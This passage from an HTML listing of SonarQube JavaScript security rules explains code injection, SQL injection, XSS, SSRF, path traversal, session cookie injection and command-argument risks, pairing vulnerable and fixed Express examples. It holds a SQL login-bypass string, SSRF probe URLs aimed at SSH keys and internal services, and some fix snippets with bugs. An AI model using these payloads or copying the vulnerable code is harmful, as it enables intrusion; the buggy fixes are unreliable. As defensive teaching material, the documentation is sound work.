    eval(&#96;product_${operation}()&#96;) // Noncompliant
    res.send(&#34;OK&#34;)
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const allowed &#61; [&#34;add&#34;, &#34;remove&#34;, &#34;update&#34;]

let operationId &#61; req.query.operationId
const operation &#61; allowed[operationId]
eval(&#96;product_${operation}()&#96;)
res.send(&#34;OK&#34;)
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br /> Therefore, our suggestion
is to avoid executing code dynamically.<br /> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<p>The example compliant code uses such a binding approach.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/" rel="nofollow">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S3649">
              jssecurity:S3649
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and
inserts it into a database query without sanitizing it first.</p>
<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is
used.</p>
<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>
<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application that is vulnerable to SQL injection:<br /> After discovering the injection, attackers inject data into the
vulnerable field to execute malicious commands in the affected databases.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Identity spoofing and data manipulation</h4>
<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread
impact.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br /> This threat is particularly insidious if the
attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Chaining DB injections with other vulnerabilities</h4>
<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br /> Most of the time, organizations overlook some
defense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple
attacks with great impact:</p>
<ul><li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li><li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).
    <ul><li> See <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">our article on this topic</a> </li></ul>  </li></ul>
<h2>How to fix it in Sequelize</h2>
<h3>Code examples</h3>
<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is
inserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some
characters may change the query logic to a malicious one.</p>
<p>In this particular case, the query can be exploited with the following string:</p>
<pre>
foo&#39; OR 1&#61;1 --
</pre>
<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in
as any user within the scoped user table.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
async function index(req, res) {
    const { db, User } &#61; req.app.get(&#39;sequelize&#39;);

    let loggedInUser &#61; await db.query(
        &#96;SELECT * FROM users WHERE user &#61; &#39;${req.query.user}&#39; AND pass &#61; &#39;${req.query.pass}&#39;&#96;,
        {
            model: User,
        }
    ); // Noncompliant

    res.send(JSON.stringify(loggedInUser));
    res.end();
}}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
async function index(req, res) {
    const { db, User, QueryTypes } &#61; req.app.get(&#39;sequelize&#39;);

    let user &#61; req.query.user;
    let pass &#61; req.query.pass;

    let loggedInUser &#61; await db.query(
        &#96;SELECT * FROM users WHERE user &#61; $user AND pass &#61; $pass&#96;,
        {
            bind: {
                user: user,
                pass: pass,
            },
            type: QueryTypes.SELECT,
            model: User,
        }
    );

    res.send(JSON.stringify(loggedInUser));
    res.end();
}
</pre>
<h3>How does this work?</h3>
<h4>Use prepared statements</h4>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an
interpreted context.</p>
<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br /> Here is an example with the
following query string (Java SE syntax):</p>
<pre>
SELECT * FROM users WHERE user &#61; ? AND pass &#61; ?
</pre>
<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol &#39;?&#39; was used as
a placeholder.</strong></p>
<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals
corresponding to the placeholders to the database.<br /> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and
some do not - because they do it transparently.</p>
<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>
<p>After compilation, the query logic is frozen and cannot be changed.<br /> So when the application passes the literals that replace the placeholders,
they are not considered application logic by the database.</p>
<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes
them.</p>
<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a
query. An attacker who controls this third-party data can cause the database to execute malicious code.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/exploiting-hibernate-injections/" rel="nofollow">SonarSource, Exploiting Hibernate Injections</a> </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP, SQL Injection Prevention Cheat
  Sheet</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/ITdGBQ" rel="nofollow">CERT, IDS00-J.</a> - Prevent SQL injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5131">
              jssecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br /> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function (req, res) {
    json &#61; JSON.stringify({ &#34;data&#34;: req.query.input });
    res.send(json);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function (req, res) {
    res.json({ &#34;data&#34;: req.query.input });
};
</pre>
<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an
<code>HttpResponse</code> object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
function (req, res) {
    res.send(req.query.input);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
function (req, res) {
    res.set(&#39;Content-Type&#39;, &#39;text/plain&#39;);
    res.send(req.query.input);
};
</pre>
<h3>How does this work?</h3>
<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href="https://ejs.co/" rel="nofollow">ejs</a> to generate
it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk
of cross-site scripting vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>
<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse
and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br /> The following content-types are known to be affected:</p>
<ul><li> application/mathml&#43;xml </li><li> application/rdf&#43;xml </li><li> application/vnd.wap.xhtml&#43;xml </li><li> application/xhtml&#43;xml </li><li> application/xml </li><li> image/svg&#43;xml </li><li> multipart/x-mixed-replace </li><li> text/html </li><li> text/rdf </li><li> text/xml </li><li> text/xsl </li></ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of &#34;javascript:&#34; URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br /> <a href="https://web.dev/csp-xss/" rel="nofollow">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" rel="nofollow">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li><li> <a href="https://expressjs.com/en/api.html" rel="nofollow">Express, 4.x API</a> </li></ul>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability" rel="nofollow">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li><li> <a href="https://blog.sonarsource.com/ghost-admin-takeover" rel="nofollow">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li><li> <a href="https://samy.pl/myspace/" rel="nofollow">Samy Kamkar, The MySpace Worm</a> </li></ul>
<h3>Conference presentations</h3>
<ul><li> <a href="https://www.youtube.com/watch?v&#61;ksq7e6UUDag" rel="nofollow">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79.html" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5144">
              jssecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br /></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br /> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br /> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const axios &#61; require(&#39;axios&#39;);
const express &#61; require(&#39;express&#39;);

const app &#61; express();

app.get(&#39;/example&#39;, async (req, res) &#61;&gt; {
    try {
        await axios.get(req.query.url); // Noncompliant
        res.send(&#34;OK&#34;);
    } catch (err) {
        console.error(err);
        res.send(&#34;ERROR&#34;);
    }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const axios &#61; require(&#39;axios&#39;);
const express &#61; require(&#39;express&#39;);

const schemesList &#61; [&#34;http:&#34;, &#34;https:&#34;];
const domainsList &#61; [&#34;trusted1.example.com&#34;, &#34;trusted2.example.com&#34;];

app.get(&#39;/example&#39;, async (req, res) &#61;&gt; {
    const url &#61; (new URL(req.query.url));

    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {
        try {
            await axios.get(url);
            res.send(&#34;OK&#34;);
        } catch (err) {
            console.error(err);
            res.send(&#34;ERROR&#34;);
        }
    }else {
        res.send(&#34;INVALID_URL&#34;);
    }
})
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2083">
              jssecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
const path &#61; require(&#39;path&#39;);
const fs   &#61; require(&#39;fs&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources/&#34;;
  const userFilename &#61; path.join(targetDirectory, req.query.filename);

  let data &#61; fs.readFileSync(userFilename, { encoding: &#39;utf8&#39;, flag: &#39;r&#39; }); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const path &#61; require(&#39;path&#39;);
const fs   &#61; require(&#39;fs&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources/&#34;;
  const userFilename &#61; path.join(targetDirectory, req.query.filename);
  const userFilename &#61; fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data &#61; fs.readFileSync(userFilename, { encoding: &#39;utf8&#39;, flag: &#39;r&#39; });
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li><li> Resolve the canonical path of the file by using methods like <code>&#96;fs.realPath&#96;</code>. This will resolve relative path or path components
  like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
const path &#61; require(&#39;path&#39;);

function (req, res) {
  const targetDirectory &#61; &#34;/data/app/resources&#34;
  const userFilename &#61; path.join(targetDirectory, req.query.filename));
  const userFilename &#61; fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data &#61; fs.readFileSync(userFilename);
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<h4>Do not use path.resolve as a validator</h4>
<p>The <a href="https://nodejs.org/api/path.html#pathresolvepaths" rel="nofollow">official documentation</a> states that if any argument other than the first is an
absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6287">
              jssecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import express from &#34;express&#34;;
import cookieParser from &#34;cookie-parser&#34;;

const app &#61; express();
app.use(cookieParser());

app.get(&#34;/checkcookie&#34;, (req, res) &#61;&gt; {
    if (req.cookies[&#34;connect.sid&#34;] &#61;&#61;&#61; undefined) {
        const cookie &#61; req.query.cookie;
        res.cookie(&#34;connect.sid&#34;, cookie); // Noncompliant
    }

    return res.redirect(&#34;/welcome&#34;);
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import express from &#34;express&#34;;
import cookieParser from &#34;cookie-parser&#34;;

const app &#61; express();
app.use(cookieParser());

app.get(&#34;/checkcookie&#34;, (req, res) &#61;&gt; {
    if (req.cookies[&#34;connect.sid&#34;] &#61;&#61;&#61; undefined) {
        return res.redirect(&#34;/getcookie&#34;);
    }

    return res.redirect(&#34;/welcome&#34;);
});
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6350">
              jssecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2016-9920" rel="nofollow">CVE-2016-9920</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2021-29472" rel="nofollow">CVE-2021-29472</a> </li></ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Malicious arguments can result in undesired behavior in the executed command. </li><li> Passing user input to a system command is not necessary. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Avoid constructing system commands from user input when possible. </li><li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li><li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li></ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
const { spawn } &#61; require(&#34;child_process&#34;);
const input &#61; req.query.input;
const proc &#61; spawn(&#34;/usr/bin/find&#34;, [input]); // Sensitive
</pre>
<h2>Compliant Solution</h2>
